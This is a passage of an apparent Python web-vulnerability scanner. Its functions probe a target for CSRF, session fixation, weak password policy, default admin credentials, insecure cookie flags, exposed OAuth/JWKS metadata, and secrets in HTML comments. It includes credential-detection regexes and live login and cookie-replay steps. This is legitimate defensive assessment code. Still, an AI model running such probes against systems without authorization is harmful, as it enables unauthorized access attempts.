            r'<input[^>]+name=["\']?(?:csrf[_\-]?token|_token|xsrf[_\-]?token)["\']?'
            r'[^>]+value=["\']([^"\']+)',
            body1, re.IGNORECASE)
        if m:
            csrf_token = m.group(1)

    # ── SameSite check via raw Set-Cookie headers ─────────────────────────────
    raw_headers = str(resp1.headers) if resp1 and hasattr(resp1, 'headers') else ''
    set_cookie_lines = [l for l in raw_headers.splitlines()
                        if l.lower().startswith('set-cookie')]
    for scl in set_cookie_lines:
        if 'samesite' not in scl.lower():
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SAMESITE_ABSENT',
                'detail': ('SAMESITE_ABSENT — Set-Cookie response missing SameSite '
                           'attribute; cross-site request forgery via third-party '
                           'origin possible (equivalent to FireSheep wireless '
                           'session-cookie reuse attack vector on unprotected sessions)'),
                'host': host,
                'port': port,
            })
            break

    # ── Step 2: CSRF token length check ──────────────────────────────────────
    if csrf_token:
        hex_chars = re.sub(r'[^0-9a-fA-F]', '', csrf_token)
        if len(hex_chars) < 16:
            findings.append({
                'severity': 'HIGH',
                'title': 'CSRF_TOKEN_TOO_SHORT',
                'detail': (f'CSRF_TOKEN_TOO_SHORT: token "{csrf_token}" contains only '
                           f'{len(hex_chars)} hex chars; minimum 16 required for '
                           f'128-bit entropy — short token is brute-forceable'),
                'host': host,
                'port': port,
            })

        # ── Step 3: Predictability check — fetch a second token ──────────────
        jar2 = http.cookiejar.CookieJar()
        op2 = _build_opener(jar2)
        _get(op2, '/login')

        csrf_token2 = None
        for cookie in jar2:
            if any(re.search(p, cookie.name.lower()) for p in csrf_patterns):
                csrf_token2 = cookie.value
                break

        if csrf_token2:
            if csrf_token == csrf_token2:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'PREDICTABLE_CSRF_TOKEN',
                    'detail': ('PREDICTABLE_CSRF_TOKEN: two independent GET /login '
                               'requests returned identical CSRF tokens — token is '
                               'static (not per-session); any token value is reusable '
                               'across arbitrary origins'),
                    'host': host,
                    'port': port,
                })
            else:
                now = int(time.time())
                for tok in (csrf_token, csrf_token2):
                    digits = re.sub(r'[^0-9]', '', tok)
                    if digits:
                        try:
                            tok_int = int(digits[:10])
                            if abs(tok_int - now) < 86400 * 30:
                                findings.append({
                                    'severity': 'HIGH',
                                    'title': 'PREDICTABLE_CSRF_TOKEN',
                                    'detail': (f'PREDICTABLE_CSRF_TOKEN: token contains '
                                               f'numeric sequence ({tok_int}) within 30 '
                                               f'days of current epoch ({now}); '
                                               f'timestamp-derived token is predictable'),
                                    'host': host,
                                    'port': port,
                                })
                                break
                        except ValueError:
                            pass
                else:
                    t1h = re.sub(r'[^0-9a-fA-F]', '', csrf_token)
                    t2h = re.sub(r'[^0-9a-fA-F]', '', csrf_token2)
                    if t1h and t2h and len(t1h) == len(t2h):
                        try:
                            delta = abs(int(t2h, 16) - int(t1h, 16))
                            if 0 < delta <= 100:
                                findings.append({
                                    'severity': 'HIGH',
                                    'title': 'PREDICTABLE_CSRF_TOKEN',
                                    'detail': (f'PREDICTABLE_CSRF_TOKEN: sequential '
                                               f'requests differ by {delta} — '
                                               f'counter-based token is trivially '
                                               f'predictable'),
                                    'host': host,
                                    'port': port,
                                })
                        except ValueError:
                            pass

    # ── Step 4: POST without CSRF token — check enforcement ──────────────────
    jar_bare = http.cookiejar.CookieJar()
    op_bare = _build_opener(jar_bare)
    post_data = b'username=test&password=test'
    status = _post_status(op_bare, '/login', data=post_data)
    if status is not None and status not in (400, 403, 422):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'CSRF_NOT_ENFORCED',
            'detail': (f'CSRF_NOT_ENFORCED: POST /login without CSRF token returned '
                       f'HTTP {status} (expected 403/422); server accepts cross-site '
                       f'form submissions — any origin can trigger authenticated '
                       f'state-changing requests on behalf of victims'),
            'host': host,
            'port': port,
        })

    # ── Step 5: Referer-based CSRF protection check ───────────────────────────
    jar_ref = http.cookiejar.CookieJar()
    op_ref = _build_opener(jar_ref)
    ref_status = _post_status(
        op_ref, '/login', data=post_data,
        extra_headers={'Referer': ''})
    if ref_status is not None and ref_status not in (400, 403, 422):
        findings.append({
            'severity': 'HIGH',
            'title': 'CSRF_REFERER_NOT_CHECKED',
            'detail': (f'CSRF_REFERER_NOT_CHECKED: POST /login with empty Referer '
                       f'returned HTTP {ref_status}; server does not validate '
                       f'Referer header — cross-origin requests accepted'),
            'host': host,
            'port': port,
        })

    return findings


def probe_session_fixation(host: str, port: int = 443, timeout: float = 5.0) -> list:
    """
    Probe session fixation and session management weaknesses.
    Informed by violent-python Chapter 5 (FireSheep WordPress session-cookie
    interception and reuse, cookie reuse detection with CookieJar hash tables)
    and Chapter 7 (Mechanize cookie handling, stateful HTTP session management).

    Checks:
      - Pre-auth session ID reused post-login (session fixation) → CRITICAL
      - Session cookie missing Secure flag on HTTPS              → HIGH
      - Session cookie missing HttpOnly flag                     → HIGH
      - Session cookie valid after logout                        → HIGH
      - Concurrent sessions allowed (old session not expired)    → MEDIUM

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []
    scheme = 'https' if port == 443 else 'http'

    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    session_name_re = re.compile(
        r'^(session|sess_?id|phpsessid|jsessionid|sid|auth[_\-]?token|_session)',
        re.IGNORECASE)

    def _is_session_cookie(name: str) -> bool:
        return bool(session_name_re.search(name))

    def _build_opener(jar):
        op = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ssl_ctx),
            urllib.request.HTTPCookieProcessor(jar),
        )
        op.addheaders = [('User-Agent', 'Mozilla/5.0')]
        return op

    def _get_status(opener, path) -> Optional[int]:
        url = f"{scheme}://{host}:{port}{path}"
        try:
            resp = opener.open(urllib.request.Request(url), timeout=timeout)
            return resp.status
        except urllib.error.HTTPError as exc:
            return exc.code
        except Exception:
            return None

    def _get_resp(opener, path):
        url = f"{scheme}://{host}:{port}{path}"
        try:
            return opener.open(urllib.request.Request(url), timeout=timeout)
        except urllib.error.HTTPError as exc:
            return exc
        except Exception:
            return None

    def _post_status(opener, path, data=b'') -> Optional[int]:
        url = f"{scheme}://{host}:{port}{path}"
        req = urllib.request.Request(url, data=data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        try:
            resp = opener.open(req, timeout=timeout)
            return resp.status
        except urllib.error.HTTPError as exc:
            return exc.code
        except Exception:
            return None

    # ── Step 1: GET /login — record pre-auth session cookie + flags ──────────
    jar_pre = http.cookiejar.CookieJar()
    op_pre = _build_opener(jar_pre)
    resp_login = _get_resp(op_pre, '/login')

    raw_headers = str(resp_login.headers) if resp_login and hasattr(resp_login, 'headers') else ''
    set_cookie_lines = [l for l in raw_headers.splitlines()
                        if l.lower().startswith('set-cookie')]

    for scl in set_cookie_lines:
        # Extract cookie name from "Set-Cookie: name=value; ..."
        parts = scl.split(':', 1)
        name_part = parts[1].strip().split('=')[0].strip() if len(parts) > 1 else ''
        if not _is_session_cookie(name_part):
            continue
        if scheme == 'https' and 'secure' not in scl.lower():
            findings.append({
                'severity': 'HIGH',
                'title': 'SESSION_COOKIE_NO_SECURE',
                'detail': (f'SESSION_COOKIE_NO_SECURE: session cookie "{name_part}" '
                           f'lacks Secure attribute on HTTPS endpoint — transmitted '
                           f'in cleartext if TLS downgrade occurs; enables passive '
                           f'interception equivalent to FireSheep wireless sniffing'),
                'host': host,
                'port': port,
            })
        if 'httponly' not in scl.lower():
            findings.append({
                'severity': 'HIGH',
                'title': 'SESSION_COOKIE_NO_HTTPONLY',
                'detail': (f'SESSION_COOKIE_NO_HTTPONLY: session cookie "{name_part}" '
                           f'lacks HttpOnly attribute — accessible via document.cookie; '
                           f'XSS yields direct session theft (JavaScript-accessible '
                           f'session ID mirrors FireSheep passive-capture attack class)'),
                'host': host,
                'port': port,
            })

    pre_auth_sessions = {c.name: c.value for c in jar_pre if _is_session_cookie(c.name)}

    # ── Step 2: POST /login — check if session ID rotates post-auth ──────────
    creds = b'username=admin&password=admin'
    _post_status(op_pre, '/login', data=creds)
    post_auth_sessions = {c.name: c.value for c in jar_pre if _is_session_cookie(c.name)}

    for name in set(pre_auth_sessions) & set(post_auth_sessions):
        if pre_auth_sessions[name] == post_auth_sessions[name]:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'SESSION_FIXATION',
                'detail': (f'SESSION_FIXATION: session cookie "{name}" unchanged '
                           f'after authentication '
                           f'({pre_auth_sessions[name][:16]}...) — pre-auth session '
                           f'ID reused post-login; attacker can fixate the session '
                           f'before victim authenticates and inherit the authed state'),
                'host': host,
                'port': port,
            })

    # ── Step 3: Logout then replay old session against protected route ────────
    post_auth_all = {c.name: c.value for c in jar_pre}
    _get_status(op_pre, '/logout')

    op_replay = _build_opener(http.cookiejar.CookieJar())
    for name, value in post_auth_all.items():
        if not _is_session_cookie(name):
            continue
        url_probe = f"{scheme}://{host}:{port}/api/profile"
        req_probe = urllib.request.Request(url_probe)
        req_probe.add_header('Cookie', f'{name}={value}')
        try:
            resp_probe = op_replay.open(req_probe, timeout=timeout)
            replay_status = resp_probe.status
        except urllib.error.HTTPError as exc:
            replay_status = exc.code
        except Exception:
            replay_status = None

        if replay_status == 200:
            findings.append({
                'severity': 'HIGH',
                'title': 'SESSION_NOT_INVALIDATED_ON_LOGOUT',
                'detail': (f'SESSION_NOT_INVALIDATED_ON_LOGOUT: session cookie '
                           f'"{name}" accepted (HTTP 200) on /api/profile after '
                           f'/logout — server-side session not destroyed; '
                           f'stolen cookie grants persistent access after victim '
                           f'believes they are logged out'),
                'host': host,
                'port': port,
            })

    # ── Step 4: Second login — check if first session is expired ─────────────
    jar_second = http.cookiejar.CookieJar()
    op_second = _build_opener(jar_second)
    _post_status(op_second, '/login', data=creds)
    second_sessions = {c.name: c.value for c in jar_second if _is_session_cookie(c.name)}

    op_old_replay = _build_opener(http.cookiejar.CookieJar())
    for name, old_val in post_auth_sessions.items():
        new_val = second_sessions.get(name)
        if not new_val or new_val == old_val:
            continue
        url_probe = f"{scheme}://{host}:{port}/api/profile"
        req_probe = urllib.request.Request(url_probe)
        req_probe.add_header('Cookie', f'{name}={old_val}')
        try:
            resp_probe = op_old_replay.open(req_probe, timeout=timeout)
            old_status = resp_probe.status
        except urllib.error.HTTPError as exc:
            old_status = exc.code
        except Exception:
            old_status = None

        if old_status == 200:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'CONCURRENT_SESSION_ALLOWED',
                'detail': (f'CONCURRENT_SESSION_ALLOWED: old session cookie "{name}" '
                           f'still valid (HTTP 200) after a new login issued a '
                           f'different session ID — server does not invalidate prior '
                           f'sessions on re-authentication; stolen sessions remain '
                           f'exploitable indefinitely'),
                'host': host,
                'port': port,
            })

    return findings


def probe_password_policy_weakness(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """
    Probes password policy weaknesses: minimum length enforcement, default
    credentials, exposed policy endpoint, and brute-force rate-limiting headers.
    Synthesized from: Security with Go (ch. Registration, Login,
                      Preventing User Enumeration and Abuse).
    """
    findings = []
    scheme = 'https' if port == 443 else 'http'
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _opener():
        jar = http.cookiejar.CookieJar()
        return urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ctx),
            urllib.request.HTTPCookieProcessor(jar),
        )

    def _post(opener, path, payload):
        url = f"{scheme}://{host}:{port}{path}"
        data = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=data, method='POST')
        req.add_header('Content-Type', 'application/json')
        req.add_header('Accept', 'application/json')
        try:
            resp = opener.open(req, timeout=timeout)
            return resp.status, resp.read(), dict(resp.headers)
        except urllib.error.HTTPError as exc:
            return exc.code, b'', {}
        except Exception:
            return None, b'', {}

    # ── Step 1: single-char password on registration endpoints ────────────
    for path in ('/api/auth/register', '/register'):
        op = _opener()
        status, _body, _hdrs = _post(
            op, path,
            {'username': 'probe_user', 'email': 'probe@example.com', 'password': 'a'},
        )
        if status in (200, 201):
            findings.append({
                'severity': 'CRITICAL',
                'title': 'WEAK_PASSWORD_ACCEPTED',
                'detail': (
                    f'WEAK_PASSWORD_ACCEPTED — no minimum length enforcement: '
                    f'POST {path} accepted single-character password '
                    f'with HTTP {status}'
                ),
                'host': host,
                'port': port,
            })
            break

    # ── Step 2: default credentials on login endpoints ────────────────────
    for path in ('/api/auth/login', '/login', '/api/login'):
        op = _opener()
        status, body, _hdrs = _post(
            op, path,
            {'username': 'admin', 'password': 'password'},
        )
        if status == 200:
            body_str = body.decode(errors='replace')
            if re.search(r'token|access_token|jwt|session', body_str, re.I):
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'DEFAULT_CREDENTIALS_VALID',
                    'detail': (
                        f'DEFAULT_CREDENTIALS_VALID — trivial password accepted: '
                        f'POST {path} returned 200 with token/session material '
                        f'for admin:password'
                    ),
                    'host': host,
                    'port': port,
                })
                break

    # ── Step 3: policy endpoint exposes weak minimum length ───────────────
    op = _opener()
    policy_url = f"{scheme}://{host}:{port}/api/auth/password-policy"
    policy_req = urllib.request.Request(policy_url)
    policy_req.add_header('Accept', 'application/json')
    try:
        resp = op.open(policy_req, timeout=timeout)
        policy = json.loads(resp.read().decode(errors='replace'))
        min_len = (
            policy.get('min_length')
            or policy.get('minLength')
            or policy.get('minimum_length')
        )
        if min_len is not None and int(min_len) < 8:
            findings.append({
                'severity': 'HIGH',
                'title': 'WEAK_PASSWORD_POLICY',
                'detail': (
                    f'WEAK_PASSWORD_POLICY — {min_len} char minimum: '
                    f'GET /api/auth/password-policy returned '
                    f'min_length={min_len}'
                ),
                'host': host,
                'port': port,
            })
    except Exception:
        pass

    # ── Step 4: rate-limiting header presence on login ────────────────────
    for path in ('/api/auth/login', '/login', '/api/login'):
        op = _opener()
        status, _body, headers = _post(
            op, path,
            {'username': 'probe', 'password': 'probe'},
        )
        if status is None:
            continue
        has_rate_limit = any(
            k.lower().startswith(('x-ratelimit', 'x-rate-limit', 'retry-after'))
            for k in headers
        )
        if not has_rate_limit:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'NO_RATE_LIMIT_HEADERS',
                'detail': (
                    f'NO_RATE_LIMIT_HEADERS — brute force not rate-limited: '
                    f'POST {path} response lacks X-RateLimit-* and '
                    f'Retry-After headers'
                ),
                'host': host,
                'port': port,
            })
        break

    return findings


def probe_secure_cookie_flags(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """
    Fetches common authenticated endpoints and audits Set-Cookie headers for
    missing HttpOnly, Secure, SameSite attributes, and excessive Max-Age.
    Synthesized from: Security with Go (ch. Creating Secure Cookies).
    """
    findings = []
    scheme = 'https' if port == 443 else 'http'
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    probe_paths = ['/', '/login', '/api/auth/login', '/api/profile', '/dashboard']
    collected_headers = []  # list of raw Set-Cookie strings

    for path in probe_paths:
        url = f"{scheme}://{host}:{port}{path}"
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0')
        try:
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx)
            )
            resp = opener.open(req, timeout=timeout)
            for k, v in resp.info().items():
                if k.lower() == 'set-cookie':
                    collected_headers.append(v)
        except Exception:
            pass

    if not collected_headers:
        return findings

    _MAX_AGE_30D = 30 * 24 * 3600

    for cookie_str in collected_headers:
        cookie_lower = cookie_str.lower()
        cookie_name = cookie_str.split('=')[0].strip()

        # ── HttpOnly ──────────────────────────────────────────────────────
        if 'httponly' not in cookie_lower:
            findings.append({
                'severity': 'HIGH',
                'title': 'COOKIE_NO_HTTPONLY',
                'detail': (
                    f'COOKIE_NO_HTTPONLY — XSS can steal session: '
                    f'cookie "{cookie_name}" lacks HttpOnly flag; '
                    f'JavaScript can read document.cookie and exfiltrate '
                    f'the session token'
                ),
                'host': host,
                'port': port,
            })

        # ── Secure flag (meaningful on HTTPS endpoints only) ──────────────
        if port == 443 and 'secure' not in cookie_lower:
            findings.append({
                'severity': 'HIGH',
                'title': 'COOKIE_NO_SECURE_FLAG',
                'detail': (
                    f'COOKIE_NO_SECURE_FLAG — session exposed on HTTP: '
                    f'cookie "{cookie_name}" served over HTTPS lacks Secure '
                    f'flag; browser will transmit it on plain HTTP requests'
                ),
                'host': host,
                'port': port,
            })

        # ── SameSite checks ───────────────────────────────────────────────
        samesite_m = re.search(r'samesite\s*=\s*(\w+)', cookie_lower)
        if samesite_m:
            samesite_val = samesite_m.group(1).lower()
            if samesite_val == 'none' and 'secure' not in cookie_lower:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'COOKIE_SAMESITE_NONE_INSECURE',
                    'detail': (
                        f'COOKIE_SAMESITE_NONE_INSECURE: cookie "{cookie_name}" '
                        f'has SameSite=None without Secure flag; cross-site '
                        f'requests include the credential without TLS guarantee'
                    ),
                    'host': host,
                    'port': port,
                })
        else:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'COOKIE_NO_SAMESITE',
                'detail': (
                    f'COOKIE_NO_SAMESITE — CSRF risk: cookie "{cookie_name}" '
                    f'lacks SameSite attribute; cross-origin requests will '
                    f'include the cookie, enabling CSRF attacks'
                ),
                'host': host,
                'port': port,
            })

        # ── Excessive Max-Age (> 30 days) ─────────────────────────────────
        max_age_m = re.search(r'max-age\s*=\s*(\d+)', cookie_lower)
        if max_age_m:
            max_age = int(max_age_m.group(1))
            if max_age > _MAX_AGE_30D:
                days = max_age // 86400
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'COOKIE_LONG_EXPIRY',
                    'detail': (
                        f'COOKIE_LONG_EXPIRY — persistent session risk: '
                        f'cookie "{cookie_name}" Max-Age={max_age}s ({days} days) '
                        f'exceeds 30-day threshold; compromised sessions remain '
                        f'valid long after user activity stops'
                    ),
                    'host': host,
                    'port': port,
                })

    return findings


def probe_oauth_server_discovery(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe OAuth/OIDC discovery endpoints for exposed server metadata."""
    import urllib.request
    import ssl
    import json as _json

    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    scheme = 'https' if port in (443, 8443) else 'http'

    def _get(path: str):
        url = f'{scheme}://{host}:{port}{path}'
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                if resp.status == 200:
                    raw = resp.read()
                    try:
                        return _json.loads(raw)
                    except Exception:
                        return None
        except Exception:
            return None

    # ── OIDC discovery ────────────────────────────────────────────────────
    oidc_doc = _get('/.well-known/openid-configuration')
    if oidc_doc is not None:
        findings.append({
            'severity': 'HIGH',
            'title': 'OIDC_DISCOVERY_EXPOSED',
            'detail': (
                'OIDC_DISCOVERY_EXPOSED — OpenID Connect discovery document '
                'accessible; server configuration, supported scopes, and '
                'endpoint URLs are publicly enumerable'
            ),
            'host': host,
            'port': port,
        })

        # Extract and report disclosed endpoints
        for field, label in (
            ('token_endpoint', 'token endpoint'),
            ('authorization_endpoint', 'authorization endpoint'),
            ('jwks_uri', 'JWKS URI'),
        ):
            value = oidc_doc.get(field)
            if value:
                findings.append({
                    'severity': 'INFO',
                    'title': 'OIDC_ENDPOINTS_DISCLOSED',
                    'detail': (
                        f'OIDC_ENDPOINTS_DISCLOSED — {value} '
                        f'{label} disclosed'
                    ),
                    'host': host,
                    'port': port,
                })

        # Check for implicit flow in OIDC doc
        rts = oidc_doc.get('response_types_supported', [])
        if any('token' in str(rt).split() or rt == 'token' for rt in rts):
            findings.append({
                'severity': 'MEDIUM',
                'title': 'OAUTH_IMPLICIT_FLOW_SUPPORTED',
                'detail': (
                    'OAUTH_IMPLICIT_FLOW_SUPPORTED — implicit flow supported '
                    '(token in URL fragment, XSS risk); access tokens exposed '
                    'in browser history and referrer headers'
                ),
                'host': host,
                'port': port,
            })

    # ── OAuth 2.0 server metadata (RFC 8414) ─────────────────────────────
    oauth_doc = _get('/.well-known/oauth-authorization-server')
    if oauth_doc is not None:
        findings.append({
            'severity': 'HIGH',
            'title': 'OAUTH_SERVER_METADATA_EXPOSED',
            'detail': (
                'OAUTH_SERVER_METADATA_EXPOSED — OAuth authorization server '
                'metadata accessible; grant types, scopes, and endpoint '
                'configuration publicly enumerable'
            ),
            'host': host,
            'port': port,
        })

        # Check for implicit flow if not already flagged from OIDC doc
        if oidc_doc is None:
            rts = oauth_doc.get('response_types_supported', [])
            if any('token' in str(rt).split() or rt == 'token' for rt in rts):
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'OAUTH_IMPLICIT_FLOW_SUPPORTED',
                    'detail': (
                        'OAUTH_IMPLICIT_FLOW_SUPPORTED — implicit flow '
                        'supported (token in URL fragment, XSS risk); access '
                        'tokens exposed in browser history and referrer headers'
                    ),
                    'host': host,
                    'port': port,
                })

    return findings


def probe_jwks_exposure(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe JWKS endpoint for key material exposure and weak configurations."""
    import urllib.request
    import ssl
    import json as _json

    findings: list = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    scheme = 'https' if port in (443, 8443) else 'http'

    url = f'{scheme}://{host}:{port}/.well-known/jwks.json'
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            if resp.status != 200:
                return findings
            raw = resp.read()
            jwks = _json.loads(raw)
    except Exception:
        return findings

    findings.append({
        'severity': 'HIGH',
        'title': 'JWKS_ENDPOINT_EXPOSED',
        'detail': (
            'JWKS_ENDPOINT_EXPOSED — JSON Web Key Set endpoint accessible; '
            'public key material and key configuration enumerable without '
            'authentication'
        ),
        'host': host,
        'port': port,
    })

    keys = jwks.get('keys', [])
    for key in keys:
        kty = key.get('kty', '')
        kid = key.get('kid')
        alg = key.get('alg', '')
        use = key.get('use')

        # ── Private key material check ────────────────────────────────────
        private_fields = [f for f in ('d', 'p', 'q') if f in key]
        if private_fields:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'JWKS_PRIVATE_KEY_EXPOSED',
                'detail': (
                    f'JWKS_PRIVATE_KEY_EXPOSED — private key material in JWKS '
                    f'endpoint (complete key compromise); fields present: '
                    f'{", ".join(private_fields)}'
                ),
                'host': host,
                'port': port,
            })

        # ── RSA key without 'use' field ───────────────────────────────────
        if kty == 'RSA' and use is None:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'JWKS_KEY_USE_ABSENT',
                'detail': (
                    'JWKS_KEY_USE_ABSENT — JWKS key has no \'use\' field '
                    '(signature/encryption key ambiguity); key may be '
                    'unintentionally accepted for both sig and enc operations'
                ),
                'host': host,
                'port': port,
            })

        # ── Weak algorithm or missing kid ─────────────────────────────────
        alg_lower = alg.lower()
        if alg_lower == 'none' or (alg_lower == 'rs256' and kid is None):
            findings.append({
                'severity': 'HIGH',
                'title': 'JWKS_WEAK_KEY_CONFIG',
                'detail': (
                    f'JWKS_WEAK_KEY_CONFIG — JWKS with '
                    f'{"\'none\' algorithm" if alg_lower == "none" else "missing key ID (kid)"}; '
                    f'algorithm={alg or "(not set)"}, kid={"(absent)" if kid is None else kid}'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_html_comment_secrets(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Extract and analyze HTML comments for sensitive information disclosure.

    Fetches the homepage and up to 5 additional common paths, then scans
    every HTML comment for secrets, internal IPs, security TODOs, version
    strings, and database connection strings.

    Inspired by the "Finding HTML Comments in a Web Page" chapter of
    Security with Go (Packt, 2018).
    """
    findings: list = []
    scheme = 'https' if port == 443 else 'http'
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    paths = ['/', '/admin', '/api', '/login', '/dev', '/test']
    pages_checked = 0

    for path in paths:
        url = f'{scheme}://{host}:{port}{path}'
        try:
            req = urllib.request.Request(
                url,
                headers={
                    'User-Agent': 'Mozilla/5.0 (compatible; ablation-scanner/1.0)',
                    'Accept': 'text/html',
                },
            )
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                raw = resp.read(1 << 20)  # 1 MB cap
            try:
                content = raw.decode('utf-8', errors='replace')
            except Exception:
                continue
        except Exception:
            continue

        pages_checked += 1
        comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL)

        for comment in comments:
            # API keys / tokens
            m = re.search(
                r'(?i)(api[_\-]?key|api[_\-]?secret|access[_\-]?token)\s*[=:]\s*[\'"]?([a-zA-Z0-9_\-]{20,})',
                comment,
            )
            if m:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'HTML_COMMENT_API_KEY',
                    'detail': (
                        f'HTML_COMMENT_API_KEY — credential pattern "{m.group(1)}" '
                        f'found in HTML comment on {path}; '
                        f'value prefix: {m.group(2)[:8]}...'
                    ),
                    'host': host,
                    'port': port,
                })

            # Database connection strings
            m_db = re.search(
                r'(?i)(mysql|postgres|mongodb|redis)://[^\s]+',
                comment,
            )
            if m_db:
                findings.append({
                    'severity': 'CRITICAL',
                    'title': 'HTML_COMMENT_DB_CONNECTION_STRING',
                    'detail': (
                        f'HTML_COMMENT_DB_CONNECTION_STRING — database URI '
                        f'({m_db.group(1)}) embedded in HTML comment on {path}'
                    ),
                    'host': host,
                    'port': port,
                })

            # Internal IP addresses
            internal_ips = re.findall(
                r'\b(10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+'
                r'|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)\b',
                comment,
            )
            for ip in set(internal_ips):
                findings.append({
                    'severity': 'HIGH',
                    'title': 'HTML_COMMENT_INTERNAL_IP',
                    'detail': (
                        f'HTML_COMMENT_INTERNAL_IP — RFC-1918 address {ip} '
                        f'disclosed in HTML comment on {path}'
                    ),
                    'host': host,
                    'port': port,
                })

            # Security-sensitive TODO/FIXME annotations
            m_todo = re.search(
                r'(?i)(TODO|FIXME|HACK|XXX|SECURITY|VULN|PASSWORD|SECRET)',
                comment,
            )
            if m_todo:
                snippet = comment.strip()[:120].replace('\n', ' ')
                findings.append({
                    'severity': 'MEDIUM',
                    'title': 'HTML_COMMENT_SECURITY_TODO',
                    'detail': (
                        f'HTML_COMMENT_SECURITY_TODO — keyword '
                        f'"{m_todo.group(1)}" in HTML comment on {path}; '
                        f'snippet: {snippet!r}'
                    ),
                    'host': host,
                    'port': port,
                })

            # Version number strings
            versions = re.findall(r'v\d+\.\d+\.\d+', comment)
            for ver in set(versions):
                findings.append({
                    'severity': 'INFO',
                    'title': 'HTML_COMMENT_VERSION_DISCLOSURE',
                    'detail': (
                        f'HTML_COMMENT_VERSION_DISCLOSURE — version string '
                        f'{ver} found in HTML comment on {path}'
                    ),
                    'host': host,
                    'port': port,
                })

    return findings


def probe_server_info_disclosure(host: str, port: int = 80, timeout: float = 10.0) -> list:
    """Detect server information disclosure through headers and error pages.

    Checks HTTP response headers for version banners and probes a
    non-existent path to trigger error pages that may leak stack traces,
    file paths, framework versions, or debug configuration.

    Inspired by the "Fingerprinting Based on HTTP Response Headers" and
    "Web Applications" chapters of Security with Go (Packt, 2018).
    """
    findings: list = []
    scheme = 'https' if port == 443 else 'http'
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def _fetch(path: str):
        url = f'{scheme}://{host}:{port}{path}'
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': 'Mozilla/5.0 (compatible; ablation-scanner/1.0)',
                'Accept': 'text/html,application/xhtml+xml,*/*',
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                return resp.headers, resp.read(512 * 1024).decode('utf-8', errors='replace')
        except urllib.error.HTTPError as exc:
            # Still want headers + body for 404/500 pages
            try:
                return exc.headers, exc.read(512 * 1024).decode('utf-8', errors='replace')
            except Exception:
                return exc.headers, ''
        except Exception:
            return None, None

    # ── Header inspection on the root page ──────────────────────────────────
    headers, body = _fetch('/')
    if headers is None:
        return findings

    # Server header with version
    server_hdr = headers.get('Server', '')
    if server_hdr and re.search(r'[\d.]', server_hdr):
        findings.append({
            'severity': 'MEDIUM',
            'title': 'SERVER_VERSION_DISCLOSED',
            'detail': (
                f'SERVER_VERSION_DISCLOSED — Server header reveals product '
                f'and version: "{server_hdr}"'
            ),
            'host': host,
            'port': port,
        })

    # X-Powered-By with version
    xpb = headers.get('X-Powered-By', '')
    if xpb:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'FRAMEWORK_VERSION_DISCLOSED',
            'detail': (
                f'FRAMEWORK_VERSION_DISCLOSED — X-Powered-By discloses '
                f'runtime/framework: "{xpb}"'
            ),
            'host': host,
            'port': port,
        })

    # ASP.NET version headers
    aspnet_ver = headers.get('X-AspNet-Version', '') or headers.get('X-AspNetMvc-Version', '')
    if aspnet_ver:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASPNET_VERSION_HEADER',
            'detail': (
                f'ASPNET_VERSION_HEADER — ASP.NET version header present: '
                f'"{aspnet_ver}"'
            ),
            'host': host,
            'port': port,
        })

    # Via header — proxy infrastructure
    via = headers.get('Via', '')
    if via:
        findings.append({
            'severity': 'INFO',
            'title': 'PROXY_INFRASTRUCTURE_DISCLOSED',
            'detail': (
                f'PROXY_INFRASTRUCTURE_DISCLOSED — Via header reveals proxy '
                f'chain: "{via}"'
            ),
            'host': host,
            'port': port,
        })

    # X-Generator — CMS disclosure
    xgen = headers.get('X-Generator', '')
    if xgen:
        findings.append({
